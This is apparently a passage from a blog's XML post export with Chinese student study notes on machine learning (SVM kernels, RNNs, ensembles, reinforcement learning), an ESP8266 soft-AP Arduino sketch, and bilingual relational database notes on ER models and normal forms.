\text{or}1-\hat{y}^nf(x^n)>0\\ 0, &amp; \text{otherwise}\end{matrix}\right.$.<br>$\frac{\partial L(f)}{\partial w_i}=\sum_{n}-\delta(\hat{y}^nf(x^n)&lt;1)\hat{y}^nx^n_i$.</1></p><p>Another formulation<br>$L(f)=\sum_{n}\varepsilon ^n+\lambda \begin{Vmatrix}w\end{Vmatrix}_ 2,\varepsilon^n=\max(0,1-\hat{y}^nf(x))$.<br>$\varepsilon ^n\geqslant 0, \varepsilon ^n\geqslant 1-\hat{y}^nf(x)\rightarrow \hat{y}^nf(x)\geqslant 1-\varepsilon^n$.<br>因为要minimize Loss，所以下面这个$\varepsilon^n$的表示形式和上面的是相同的.<br>$\varepsilon ^n$: slack variable. Quadratic Programming(QP) Problem.</p><h3 id="Dual-Representation"><a href="#Dual-Representation" class="headerlink" title="Dual Representation"></a>Dual Representation</h3><p>Kernel Method<br>Step1:<br>$w^{\ast}=\sum_{n}a^{\ast}_ n x^n$. Linear combination of data points.<br>Hinge Loss的时候，$\alpha$是sparse的，有很多为0<br>所以写成向量形式$w=\sum_{n}a_n x^n=X\alpha$.<br>$f(x)=w^{T}x=\alpha^{T}X^{T}x$. 最后得到的就是一个scalar<br>$f(x)=\sum_{n}\alpha_n(x^n\cdot x)=\sum_{n}\alpha_{n}K(x^n,x)$. $K(x^n,x)$就是Kernel Function,是$x^n$和$x$的inner product.<br>Step2,3: Find $\{\alpha_1^{\ast},\alpha_2^{\ast},\cdots, \alpha_N^{\ast}\}$.<br>We don’t really need to know vector $x$.<br>We only need to know the inner project between a pair of vectors $x$ and $z$. $K(x,z)$. Kernel Trick</p><p>Directly computing $K(x,z)$ can be faster than “feature transformation + inner product” sometimes.<br>就是直接计算$K(x,z)$，可能要比eature transformation + inner product计算快上许多<br>比如$K(x,z)=\phi(x)\cdot \phi(z)=(x\cdot z)^2$.</p><p>Radial Basic Function Kernel<br>$K(x,z)=\exp \left ( -\frac{1}{2}\begin{Vmatrix}x-z\end{Vmatrix}_ 2\right )=\phi (x)\cdot \phi (z)$. $\phi (\ast)$ has inf dim.<br>$=\exp \left ( -\frac{1}{2}\begin{Vmatrix}x\end{Vmatrix}_ 2-\frac{1}{2}\begin{Vmatrix}z\end{Vmatrix}_ 2+x\cdot z\right )$.<br>$=\exp \left(-\frac{1}{2}\begin{Vmatrix}x\end{Vmatrix}_ 2 \right )\exp \left(-\frac{1}{2}\begin{Vmatrix}z\end{Vmatrix}_ 2 \right )\exp(x\cdot z)=C_xC_z\exp (x\cdot z)=C_xC_z\sum_{i=0}^{\infty}\frac{(x\cdot z)^i}{i!}$. Tayor展开</p><p>Sigmoid Kernel<br>$K(x,z)=\tanh (x\cdot z)$.<br>When using sigmoid kernel, we have a 1 hidden layer network.<br><img src="/img/note-ml/20190807141148.png" alt></p><p>You can directly design $K(x,z)$ instead of considering $\phi (x), \phi (z)$.<br>When $x$ is structured object like sequence, hard to design $\phi(x)$.<br>$K(x,z)$ is something like similarity. (Mercer’s theory can check)</p><h2 id="Recurrent-Neural-Network"><a href="#Recurrent-Neural-Network" class="headerlink" title="Recurrent Neural Network"></a>Recurrent Neural Network</h2><p>一种有记忆的NN，可以根据上下文判断的NN</p><p>The output of hidden layer are stored in the memory.<br>Memory can be considered as  another input.</p><p>All the weights are “1”, no bias.<br>All activation functions are linear</p><p>Changing the sequence order will change the output.</p><p>Elman Network. 就是每层的output当成这层的input<br>Jordan Network. 最后的output当成input</p><h3 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h3><p>双向的RNN，扩大看到的范围，不仅可以从上文还可以从下文看</p><h3 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h3><p><img src="/img/note-ml/20190808094431.png" alt><br><img src="/img/note-ml/20190808095212.png" alt><br>这三个参数，是根据输入的vector的transpose得到的</p><h3 id="Learning"><a href="#Learning" class="headerlink" title="Learning"></a>Learning</h3><p>用的也是Gradient Descent，但是是一种Backpropagation through time(BPTT)</p><p>RNN也是比较难Train的<br>The error surface is rough.<br>RNN的Total Loss是非常陡峭的，Error Surface有些地方非常平坦，有些地方非常陡峭<br>有个方法就是Clipping，当Gradient超过某一个值的时候，就等于这个值，也就是设置个上限，不至于参数飞出去</p><h3 id="Helpful-Techniques"><a href="#Helpful-Techniques" class="headerlink" title="Helpful Techniques"></a>Helpful Techniques</h3><p>Long Short-term Memory(LSTM)</p><ul><li>Can deal with gradient vanishing(not gradient explode).</li><li>Memory and input are added.</li><li>The influence never disappears unless forget gate is closed.</li></ul><p>Gated Recurrent Unit(GRU)</p><p>Clockwise RNN<br>Structurally Constrained Trcurrent Network(SCRN)<br>Vanilla RNN Initialized with Identity matrix + ReLU activation function.</p><h3 id="More-Application"><a href="#More-Application" class="headerlink" title="More Application"></a>More Application</h3><p>Many to One : Input is a vector sequence, but output is only one vector</p><ul><li>Sentiment Analysis</li><li>Key Term Extraction</li></ul><p>Many to Many : Both input and output are both sequences, but the output is shorter.</p><ul><li>Speech Recognition<br>但是这个，在每一小段时间中识别，最后去除重复的不能识别叠字</li><li>Connectionist Temporal Classification(CTC)<br>在之间可以添加符号null，可以解决叠字问题</li><li>Sequence to sequence learning<br>Both input and output are both sequences with different lengths.<br>比如做Machine Translation</li><li>Beyond Sequence<br>Syntactic parsing</li><li>Sequence-to-sequence Auto-encoder - Text<br>To understand the meaning of a word sequence, the order of the words can not be ignored.</li><li>Sequence-to-sequence Auto-encoder - Speech<br>Dimension reduction for a sequence with variable length audio segments(word-level) -&gt; fixed-length vector</li></ul><h3 id="Attention-based-Model"><a href="#Attention-based-Model" class="headerlink" title="Attention-based Model"></a>Attention-based Model</h3><p>Reading Head Controller<br>Writing Head Controller</p><p>Neural Turing Machine</p><p>常用在Reading Comprehension</p><h3 id="Integrated-Together"><a href="#Integrated-Together" class="headerlink" title="Integrated Together"></a>Integrated Together</h3><p>deep learning和structured learning结合起来。input features 先通过RNN/LSTM，然后RNN/LSTM的output再做为HMM/svm的input。用RNN/LSTM的output来定义HMM/structured SVM的evaluation function，如此就可以同时享有deep learning的好处，也可以有structure learning的好处。</p><p>下面讨论了一下structure Learning是否practical的问题</p><h2 id="Ensemble"><a href="#Ensemble" class="headerlink" title="Ensemble"></a>Ensemble</h2><p>集成学习</p><h3 id="Framework-of-Ensemble"><a href="#Framework-of-Ensemble" class="headerlink" title="Framework of Ensemble"></a>Framework of Ensemble</h3><p>Get a set of classifiers. They should be diverse.<br>Aggregate the classifiers(properly).</p><p>就是多个model一起搞的感觉</p><h3 id="Bagging"><a href="#Bagging" class="headerlink" title="Bagging"></a>Bagging</h3><p>将几个model的结果平均，这样如果你的model非常复杂，很容易overfit那么这是很有效的，因为bias比较小，variance比较大。</p><p>Decision Tree 就比较容易overfit，需要做bagging<br>这个就简单讲了一下<br><img src="/img/note-ml/20190820213252.png" alt></p><p>Random Forest</p><p>Descision Tree is easy to achieve 0% error rate on training data, if each training example has its own leaf..<br>Random forest: Bagging of decision tree</p><ul><li>Resampling trainging data is not sufficient.</li><li>Randomly restrict the features/questions used in each split.<br>Out-of-bag validation for bagging</li></ul><h3 id="Boosting"><a href="#Boosting" class="headerlink" title="Boosting"></a>Boosting</h3><p>Improving Weak Classifiers<br><img src="/img/note-ml/20190820214805.png" alt><br><img src="/img/note-ml/20190820215542.png" alt></p><p>其中最经典的一个做法<br><img src="/img/note-ml/20190820215551.png" alt></p><p>Math Warning，说实话这段没打听懂<br><img src="/img/note-ml/20190820220738.png" alt><br><img src="/img/note-ml/20190820220746.png" alt><br><img src="/img/note-ml/20190820220755.png" alt><br><img src="/img/note-ml/20190820220805.png" alt><br>这张图片里的空白在下张图片中出现了<br><img src="/img/note-ml/20190820220833.png" alt></p><p>证明地方真的晕了，改天看8…</p><h3 id="Stacking"><a href="#Stacking" class="headerlink" title="Stacking"></a>Stacking</h3><p>Majority Vote</p><h2 id="Deep-Reinforcement-Learning"><a href="#Deep-Reinforcement-Learning" class="headerlink" title="Deep Reinforcement Learning"></a>Deep Reinforcement Learning</h2><p>这里就略讲了一下<br>主要是几个部分<br>Environment-&gt;observation/state &amp; reward -&gt; Agent -&gt; action -&gt; Environment<br>要做的就是maximize reward</p><p>难点<br>Reward delay<br>Agent’s actions affect the subsequent data it receives</p><p>方法<br>就是Policy-based 和Value-based<br>先有Valued-based的方法，再有Policy-based的方法。在Policy-based的方法里面，会learn一个负责做事的Actor，在Valued-based的方法会learn一个不做事的Critic，专门批评不做事的人。我们要把Actor和Critic加起来叫做Actor+Critic的方法。<br>Asynchronous Advantage Actor-Critic(A3C)这个方法比较强</p><p>reference</p><ul><li>Textbook: Reinforcement Learning: An Introduction <a href="https://webdocs.cs.ualberta.ca/~sutton/book/the-book.html" target="_blank" rel="noopener">https://webdocs.cs.ualberta.ca/~sutton/book/the-book.html</a></li><li>Lectures of David Silver <a href="http://www0.cs.ucl.ac.uk/staff/D.Silver/web/Teaching.html" target="_blank" rel="noopener">http://www0.cs.ucl.ac.uk/staff/D.Silver/web/Teaching.html</a> (10 lectures, 1:30 each) <a href="http://videolectures.net/rldm2015_silver_reinforcement_learning/" target="_blank" rel="noopener">http://videolectures.net/rldm2015_silver_reinforcement_learning/</a> (Deep Reinforcement Learning )</li><li>Lectures of John Schulman <a href="https://youtu.be/aUrX-rP_ss4" target="_blank" rel="noopener">https://youtu.be/aUrX-rP_ss4</a></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>李宏毅，机器学习2017 fall，<a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_ML17_2.html" target="_blank" rel="noopener">http://speech.ee.ntu.edu.tw/~tlkagk/courses_ML17_2.html</a>，台湾大学</li><li><a href="https://datawhalechina.github.io/leeml-notes/#/" target="_blank" rel="noopener">https://datawhalechina.github.io/leeml-notes/#/</a></li></ul><h2 id="Feeling"><a href="#Feeling" class="headerlink" title="Feeling"></a>Feeling</h2><p>感觉台湾腔好可爱啊哈哈哈哈哈哈哈哈哈哈</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machinelearning </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学学习归档</title>
      <link href="/blog/misc-da-xue-gui-dang/"/>
      <url>/blog/misc-da-xue-gui-dang/</url>
      
        <content type="html"><![CDATA[<p>嗯…我先都删了，之后写个爬虫爬我自己文章重新整理下<br>给爷爬， 别站在主页</p><h2 id="专业课合集"><a href="#专业课合集" class="headerlink" title="专业课合集"></a>专业课合集</h2><a href="/blog/note-niit/" title="专业课笔记">专业课笔记</a><h2 id="2018-2019-第一学期"><a href="#2018-2019-第一学期" class="headerlink" title="2018-2019 第一学期"></a>2018-2019 第一学期</h2><h2 id="2018-2019-第二学期"><a href="#2018-2019-第二学期" class="headerlink" title="2018-2019 第二学期"></a>2018-2019 第二学期</h2><h2 id="2019-2020-第一学期"><a href="#2019-2020-第一学期" class="headerlink" title="2019-2020 第一学期"></a>2019-2020 第一学期</h2><h2 id="2019-2020-第二学期"><a href="#2019-2020-第二学期" class="headerlink" title="2019-2020 第二学期"></a>2019-2020 第二学期</h2><h2 id="2020-2021-第一学期"><a href="#2020-2021-第一学期" class="headerlink" title="2020-2021 第一学期"></a>2020-2021 第一学期</h2><h2 id="2020-2021-第二学期"><a href="#2020-2021-第二学期" class="headerlink" title="2020-2021 第二学期"></a>2020-2021 第二学期</h2><h2 id="2021-2022-第一学期"><a href="#2021-2022-第一学期" class="headerlink" title="2021-2022 第一学期"></a>2021-2022 第一学期</h2><h2 id="2022-2023-第二学期"><a href="#2022-2023-第二学期" class="headerlink" title="2022-2023 第二学期"></a>2022-2023 第二学期</h2>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP8266WiFi模块</title>
      <link href="/blog/esp-wifi/"/>
      <url>/blog/esp-wifi/</url>
      
        <content type="html"><![CDATA[<p>一开始设置WiFi一直连不上，最后发现是模式有问题，默认是STA模式，所以begin是连不上的…<br>然后改成了用softAP模式启动就可以了…等着以后来补补吧…<br>周一专业课考试嗷，考完有时间搞一下，最近也没玩CTF..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ESP8266WiFi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Serial.begin(<span class="number">115200</span>);</span><br><span class="line">  Serial.println();</span><br><span class="line"></span><br><span class="line">  Serial.print(<span class="string">"Setting soft-AP ... "</span>);</span><br><span class="line">  boolean result = WiFi.softAP(<span class="string">"www"</span>, <span class="string">"password"</span>);</span><br><span class="line">  <span class="keyword">if</span>(result == <span class="literal">true</span>) &#123;</span><br><span class="line">    Serial.println(<span class="string">"Ready"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Serial.println(<span class="string">"Failed!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Serial.<span class="built_in">printf</span>(<span class="string">"Stations connected = %d\n"</span>, WiFi.softAPgetStationNum());</span><br><span class="line">  <span class="keyword">if</span>(WiFi.softAPgetStationNum()) &#123;</span><br><span class="line">    WiFi.printDiag(Serial);</span><br><span class="line">    Serial.println(WiFi.localIP());</span><br><span class="line">  &#125;</span><br><span class="line">  delay(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>完美图解物联网IoT实操. ESP8266 Arduino，Cordova物联网移动App， JavaScript微控制器编程 / 赵英杰著.—北京：电子工业出版社，2018.9</li></ul>]]></content>
      
      
      <categories>
          
          <category> esp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业课笔记</title>
      <link href="/blog/note-niit/"/>
      <url>/blog/note-niit/</url>
      
        <content type="html"><![CDATA[<p>引用站内文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% post_link 文章文件名（不要后缀） 文章标题（可选） %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="第一学期"><a href="#第一学期" class="headerlink" title="第一学期"></a>第一学期</h2><ul><li><a href="/blog/note-PLT/" title="PLT笔记">PLT笔记</a></li><li></li><li><a href="/blog/note-vim/" title="Vim笔记">Vim笔记</a></li><li><a href="/blog/note-shell/" title="Shell笔记">Shell笔记</a></li></ul><h2 id="第二学期"><a href="#第二学期" class="headerlink" title="第二学期"></a>第二学期</h2><ul><li><a href="/blog/note-rdbms/" title="关系数据库管理系统(RDBMS)笔记">关系数据库管理系统(RDBMS)笔记</a></li><li><a href="/blog/note-java/" title="Java笔记">Java笔记</a></li><li><a href="/blog/note-mysql/" title="MySQL笔记">MySQL笔记</a></li><li><a href="/blog/note-database/" title="数据库笔记">数据库笔记</a></li><li><a href="/blog/note-zzbds/" title="正则表达式笔记">正则表达式笔记</a></li></ul><h2 id="第三学期"><a href="#第三学期" class="headerlink" title="第三学期"></a>第三学期</h2><ul><li><a href="/blog/note-servlet-and-jsp/" title="Servlet & JSP笔记">Servlet & JSP笔记</a></li><li><a href="/blog/note-hadoop/" title="Hadoop笔记">Hadoop笔记</a></li><li><a href="/blog/note-hbase/" title="HBase笔记">HBase笔记</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> niit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关系数据库管理系统(RDBMS)笔记</title>
      <link href="/blog/note-rdbms/"/>
      <url>/blog/note-rdbms/</url>
      
        <content type="html"><![CDATA[<p>关系型数据库管理系统（Relational Database Management System，RDBMS）</p><p>亲，双语对照</p><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul><li>候选键 ：表中可以唯一确定一个元组的某个属性（或者属性组）叫候选键</li><li>主键 : 从许多候选键(可包含多个属性)中挑一个用来维护记录的完整性就叫主键。</li><li>外键 ：一个属性（或属性组），它不是这个表的主键，但是它别的表的主键，它就是这个表的外键。</li><li>主属性 ：一个属性只要在任何一个候选键中出现过，这个属性就是主属性。</li><li>非主属性 ：与上面相反，没有在任何候选键中出现过，这个属性就是非主属性。</li></ul><h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h2><p>A data model is a description of the data in a database. In addition, the data model describes the relationship among data, and any constraints that have to be defined on the data. Data models can broadly be classified into the following categories.</p><ul><li>Object-based logical model: Focuses on desctibing the data, the relationship among the data, and any constraints defined.</li><li>Record-based logical model: Focuses on specifying the logical structuring of the database.</li></ul><h3 id="ER模型-ER-Model"><a href="#ER模型-ER-Model" class="headerlink" title="ER模型(ER Model)"></a>ER模型(ER Model)</h3><p>ER模型是基于对象的逻辑模型(Object-Based Logical Model)<br>“实体”-“关系”模型，是描述数据及其联系的数据模型<br>The ER model views the real world as a collection of objects or entities and the relationship among them.</p><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体：客观存在并可以相互区分的事物<br>Entities:a thing, whick can be easily identitfied.</p><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><p>属性：实体所具有的若干特征<br>Attributes: an attribute is a property of given entity.</p><h4 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h4><p>关系：实体之间的联系<br>Relationships: an association among entities.<br>A relationship type is an association of entity types. A relationship instance is an association of entity instances.<br>A relationship can associate an entity with itself.<br>关系类型： </p><ul><li>One-to-One</li><li>One-to-Many(or Many-to-One)</li><li>Many-to-Many</li></ul><h4 id="子类型和超类型"><a href="#子类型和超类型" class="headerlink" title="子类型和超类型"></a>子类型和超类型</h4><p>子类型是另一个实体的子集<br>A subtype is a subset of another entity.<br>超类型就是那个完整的集合咯<br>A subentity or subtype is always dependent on the supertype for its existence.The attributes of a supertype apply to all of its subtypes. The converse is not true.<br>The supertype is connected to the relationship with a line containing a crossbar, as indicated in the preceding diagram. The attributes, which describe supertype will also belong to all subtypes. The subtype is described by the attributes that are unique to it.</p><h3 id="基于记录的逻辑模型-Record-Based-Logical-Model"><a href="#基于记录的逻辑模型-Record-Based-Logical-Model" class="headerlink" title="基于记录的逻辑模型(Record-Based Logical Model)"></a>基于记录的逻辑模型(Record-Based Logical Model)</h3><p>层次模型：树形结构<br>网状模型：不加任何条件限制的无向图<br>关系模型：采用二维表来表示，满足一定条件的二维表称为关系；二维表中凡能唯一标识元祖的最小属性集称为该表的键或码。</p><h4 id="Hierarchical-Model-层次模型"><a href="#Hierarchical-Model-层次模型" class="headerlink" title="Hierarchical Model(层次模型)"></a>Hierarchical Model(层次模型)</h4><p>In this model, data is represented in the form of a tree, and relationships between the data are represented by links.</p><h4 id="Network-Model-网状模型"><a href="#Network-Model-网状模型" class="headerlink" title=" Network Model(网状模型)"></a> Network Model(网状模型)</h4><p>In this model, the data and relationships among them are represented in the form of records and links. It is similar to a hierarchical model. However, records in a databse are represented by graphically.</p><h4 id="Relational-Model-关系模型"><a href="#Relational-Model-关系模型" class="headerlink" title=" Relational Model(关系模型)"></a> Relational Model(关系模型)</h4><p>In this model, the table in a database has a fixed length record with fixed number of attributes or fields. Of these three models, the relational model is the most popular.</p><h4 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h4><p>关系数据结构</p><p>An RDBMS can be defined as a database management system where all the data visible to the user is organized strictly as tables of data values, and all the database operations work on these tables.</p><p>The basic principle in a relational database is a tabular arrangement of data values. Each table in a databse has a unique table name that identifies its contents.</p><p>The row(or record) in the table is called a tuple, and the column(or field) is called an attribute. Every column in a table must have a unique name. The number of tuples is called the cardinality of the table, and the number of attributes is called the degree of the table.<br>One important property of a relation is that its rows are unordered. Every table must have some column or conbination of columns that uniquely identifies each row in the table.<br>No two rows of table contain the same values in that column or column conbination. This column is called the primary key.<br>A table where every row is different from all other rows is called relation.<br>Each attribute of a table has an associated domain(域). A domain is a collection of values from which one or more attribute(columns) draw their actual values. The domain lists the possible values for an attribute. (域就是所有取值可能)</p><h3 id="ER图-ER-Diagram"><a href="#ER图-ER-Diagram" class="headerlink" title="ER图(ER Diagram)"></a>ER图(ER Diagram)</h3><p>矩形框：表示实体，在框中记入实体名。<br>菱形框：表示联系，在框中记入联系名。<br>椭圆形框：表示实体或联系的属性，将属性名记入框中。对于主属性名，则在其名称下划一下划线。<br>连线：实体与属性之间；实体与联系之间；联系与属性之间用直线相连，并在直线上标注联系的类型。（对于一对一联系，要在两个实体连线方向各写1； 对于一对多联系，要在一的一方写1，多的一方写N；对于多对多关系，则要在两个实体连线方向各写N,M。)</p><h3 id="关系运算-Relational-Operators"><a href="#关系运算-Relational-Operators" class="headerlink" title="关系运算(Relational Operators)"></a>关系运算(Relational Operators)</h3><h4 id="Restrict-约束限制"><a href="#Restrict-约束限制" class="headerlink" title="Restrict 约束限制"></a>Restrict 约束限制</h4><p>The restrict operator extracts specified tuple or rowss from a given relation besed on a condition.<br>约束：根据条件提取几个元组</p><h4 id="Project-投影"><a href="#Project-投影" class="headerlink" title="Project 投影"></a>Project 投影</h4><p>The project operator extracts specified attributes or columns from a given relation.<br>提取几列成为新的表</p><h4 id="Produce-乘"><a href="#Produce-乘" class="headerlink" title="Produce 乘"></a>Produce 乘</h4><p>The product operator joins two relations such that every tuple of the first relation is matched with every tuple of second relation. To be product compatible, the two tables must have common attributes.</p><h4 id="Union-并"><a href="#Union-并" class="headerlink" title="Union 并"></a>Union 并</h4><p>The union operator builds a relation from tuples appearing in erither or both of the specified relations where as intersect operator builds a relation consisting of tuples that appear in both the relations.</p><h4 id="Intersect-交"><a href="#Intersect-交" class="headerlink" title="Intersect 交"></a>Intersect 交</h4><p>The intersect operator builds a relation consisting of tuples that appear in both the relaiton.</p><h4 id="Difference-差"><a href="#Difference-差" class="headerlink" title="Difference 差"></a>Difference 差</h4><p>The difference operator builds a relation of tuples appearing in the first but not in the second of the two specified relation.</p><h4 id="Join-连接"><a href="#Join-连接" class="headerlink" title="Join 连接"></a>Join 连接</h4><p>The join operator builds a relation from two specified relations. This relation consists of all the possible combinations of tuples, one from each relation that satisfies the specified condition. The join operation requires a common attribute.</p><h4 id="Divide-除"><a href="#Divide-除" class="headerlink" title="Divide 除"></a>Divide 除</h4><p>The divide operator takes two relations and builds another relation consisting of values of an attribute of one relation that match all the values in the other relation. The divide operation is the opposite of the product operation.</p><h2 id="数据库设计-Database-design"><a href="#数据库设计-Database-design" class="headerlink" title="数据库设计(Database design)"></a>数据库设计(Database design)</h2><h3 id="将图标映射到表格"><a href="#将图标映射到表格" class="headerlink" title="将图标映射到表格"></a>将图标映射到表格</h3><p>ER图中几个重要的组成</p><ul><li>Regular entities</li><li>Attributes</li><li>Relationships</li><li>Weak entities</li><li>Subtypes and supertypes</li></ul><h4 id="Weak-entities"><a href="#Weak-entities" class="headerlink" title="Weak entities"></a>Weak entities</h4><p>A weak entities is an entity whose existence depends on some other entity. The weak entities have the composite key, part of which consists of the primary key of the entity they depend on.</p><h3 id="基于逻辑的数据库设计"><a href="#基于逻辑的数据库设计" class="headerlink" title="基于逻辑的数据库设计"></a>基于逻辑的数据库设计</h3><h4 id="Attributes"><a href="#Attributes" class="headerlink" title="Attributes"></a>Attributes</h4><ul><li>It identifies its owner entity.</li><li>It refers to another entity.</li><li>It simplifies the description of an entity.</li></ul><h4 id="Keys"><a href="#Keys" class="headerlink" title="Keys"></a>Keys</h4><ul><li>Primary</li><li>Foreign</li><li>Candidate</li><li>Alternate</li><li>Composite</li></ul><p>Any attribute(or set of attributes) that uniquely identifies a row in  table is a candidate for the primary key(主键). Such an attribute is called a candidate key(候选键). One of the candidate keys is chosen to be the primary key, based on the familiarity and greater usage. Any attribute that is a candidate for the primary key but is not the primary key is called the alternate key(替代键). When the key that uniquely identifies the row of the table is made up of more than one attribute, it is called a composite key(组合键).</p><h4 id="Entities"><a href="#Entities" class="headerlink" title="Entities"></a>Entities</h4><p>Some attributes may acquire further attributes to qualify themselves during databses design and become entities.</p><h4 id="Subentities"><a href="#Subentities" class="headerlink" title="Subentities"></a>Subentities</h4><p>Specialization(特化) is the result of taking a subset of a higher-level entity set to form a lower-level  entity set.<br>Generalization(概化) is the result of taking the union of two or more lower-level entity set to produce a higher-level entity set. It is the opposite of specialization.</p><h2 id="规范化定义-范式"><a href="#规范化定义-范式" class="headerlink" title="规范化定义(范式)"></a>规范化定义(范式)</h2><p>Normalization is a method of breaking down complex table structures into simple table structures by using certaion rules. Using this mathod, you can reduce redundancy in a table, and eliminate the problems of inconsistency and disk space usage. You can also ensure that there is no loss of information.</p><p>Normalization has the following benefits</p><ul><li>It helps in maintaining data integrity(完整).</li><li>It helps in simplifying the structure of tables, therefore, making a database more compact(简洁).</li><li>It helps in reducing the null values, which reduces the complexity of data operation.</li></ul><p>Achieve a good database design</p><ul><li>Each table should have an identifier</li><li>Each table should store data for a single type of entity.</li><li>Columns that accept NULLs should be avoided.</li><li>The reprtition of values or columns should be avoided.</li></ul><h3 id="第一范式-1NF"><a href="#第一范式-1NF" class="headerlink" title="第一范式(1NF)"></a>第一范式(1NF)</h3><p>A table is said to be 1NF when each cell of the table contains precisely one value.<br>定义：符合1NF的关系中的每个属性都不可再分解, 并且在一条记录里一个属性只能对应一个值</p><p>Guidelines</p><ul><li>Place the related data values in a table. Further, define similar data values with the column name.</li><li>There should be no repeating group in the table.</li><li>Every table must have a unique primary key.</li></ul><p>Functional dependency(函数依赖)<br>如果属性A依赖B，那么B就叫决定因素determinant</p><p>函数依赖就是对于每个x都有唯一的y与之对应，记作x-&gt;y<br>部分依赖(partial dependency) 不完全依赖于键，如有组合键时只依赖于组合键中的某一个键<br>依赖传递(transitive dependency) x-&gt;y-&gt;z</p><h3 id="第二范式-2NF"><a href="#第二范式-2NF" class="headerlink" title="第二范式(2NF)"></a>第二范式(2NF)</h3><p>A table is said to be in 2NF when:</p><ul><li>It is in 1NF, and</li><li>No partial dependency exists between non-key attributes and key attributes.</li><li>定义： 符合1NF的前提下, 当表存在组合主键的时候, 每一个非键属性都必须完全依赖于组合主键中的所有主键, 而不能只依赖部分主键</li></ul><p>Guidelines</p><ul><li>Find and remove attributes that are functionally dependent on only a part of the key and not on the whole key. Place them in a different table.</li><li>Group the remaining attributes.</li></ul><h3 id="第三范式-3NF"><a href="#第三范式-3NF" class="headerlink" title="第三范式(3NF)"></a>第三范式(3NF)</h3><p>A relation is said to be in 3NF if and only if:</p><ul><li>It is in 2NF, and</li><li>No transitive(indirect) dependency exists between non-key attributes and key attributes.</li></ul><p>定义：符合2NF的前提下, 每一个非主键属性和主键之间不能有依赖传递(间接依赖)</p><p>Guidelines</p><ul><li>Find and remove non-key attributes that are functionally dependent on attributes that are not the primary key. Place them in a different table.</li><li>Group the remaining attributes.</li></ul><h3 id="BCNF-鲍依斯-科得范式"><a href="#BCNF-鲍依斯-科得范式" class="headerlink" title="BCNF(鲍依斯-科得范式)"></a>BCNF(鲍依斯-科得范式)</h3><p>The original definition of 3NF was not sufficient in some situations.<br>不满足的情况</p><ul><li>That had multiple candidate keys.</li><li>Where the multiple candidate keys were composite.</li><li>Where the multiple candidate keys overlapped(had at least one attribute in common).<br>A relation is in BCNF if and only if every determinant is candidate key.</li></ul><p>定义：符合3NF的前提下, 同时主属性内部没有部分依赖或者依赖传递关系</p><p>Guidelines </p><ul><li>Find and remove the overlapping candidate keys. Place the part of the candidate key an th attribute it is functionally dependent on, in a different table.</li><li>Group the remaining items into a table.</li></ul><h3 id="逆范式"><a href="#逆范式" class="headerlink" title="逆范式"></a>逆范式</h3><p>The intentional introduction of redundancy in a table in order to improve performance is called denormalization.<br>逆范式化指的是根据项目情况故意通过增加冗余或重复的数据来提高数据库的查询性能(从而避免频繁使用性能较差的连接语句或子查询语句)</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> database </tag>
            
            <tag> rdbms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP8266的LED灯</title>
      <link href="/blog/esp-digital-light/"/>
      <url>/blog/esp-digital-light/</url>
      
